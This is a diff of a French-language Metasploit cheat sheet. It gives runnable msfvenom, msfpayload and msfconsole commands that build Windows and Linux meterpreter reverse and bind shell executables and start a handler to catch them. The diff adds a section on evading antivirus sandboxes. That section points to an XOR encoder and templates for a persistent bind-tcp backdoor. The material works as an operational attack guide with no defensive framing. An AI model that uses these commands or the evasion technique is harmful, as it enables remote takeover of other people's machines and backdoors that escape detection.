@@ -1,5 +1,5 @@
 ﻿#Metasploit#
-##Genration de payload executables##
+##Genération de payload exécutables##
 ###Manuel###
 ~~~~~~~
 # msfvenom -h
@@ -33,6 +33,13 @@ Options:
 # msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=$(ifdata -pa eth0) LPORT=5555 > windobReverseMeterpreter5555.exe
 ~~~~~~~
 
+####Créer un payload meterpreter pour Linux####
+~~~~~~~
+# msfvenom -p linux/x86/meterpreter/bind_tcp -f elf LPORT=5555 > linuxMeterpreter5555.bin
+~~~~~~~
+
+
+
 ###Alternative###
 ~~~~~~~
 # msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.1 X > met-reverse.exe
@@ -41,16 +48,17 @@ Options:
 ##Lancement de handler##
 ~~~~~~~
 # msfcli multi/handler LPORT=5555 E
+~~~~~~~
 
+##Exploitation depuis msfconsole##
+Cette méthode evite de charger deux fois le gros de metasploit.
 
-use payload/linux/x86/meterpreter/bind_tcp
-
+~~~~~~~
 use payload/windows/meterpreter/bind_tcp
 set LPORT 8888
 show options
 generate -t exe -f /root/meterpreter6666.exe
-exploit
-
+back
 
 use exploit/multi/handler
 set PAYLOAD windows/meterpreter/bind_tcp
@@ -59,4 +67,11 @@ set LPORT 8888
 exploit
 ~~~~~~~
 
-[https://github.com/MrTchuss/Metasploit-stuff/tree/master/tools](https://github.com/MrTchuss/Metasploit-stuff/tree/master/tools)
+## Contournement des antivirus##
+Certains virus utilisent des sandboxes pour lancer les exécutables et vérifier leur dangerosité. (Mal)heureusement, ces sandboxes implémentent rarement les communication réseaux, pour des raisons de sécurités.
+
+Il est donc possible de cacher un payload malveillant en vérifiant la possibilité d'effectuer une connexion réseau. En utilisant le template [ci-joint](../ressources/Tools/metasploit/meterpreterTemplate1.zip) et l'encoder metasploit [ci-joint](../ressources/Tools/metasploit/xorbyte.rb) à placer dans modules/encoders/x86/xorbyte.rb.
+
+Pour une backdoor plus permanente, en bind tcp, il est possible d'utiliser le template [ci-joint](../ressources/Tools/metasploit/meterpreterTemplate2.zip).
+
+
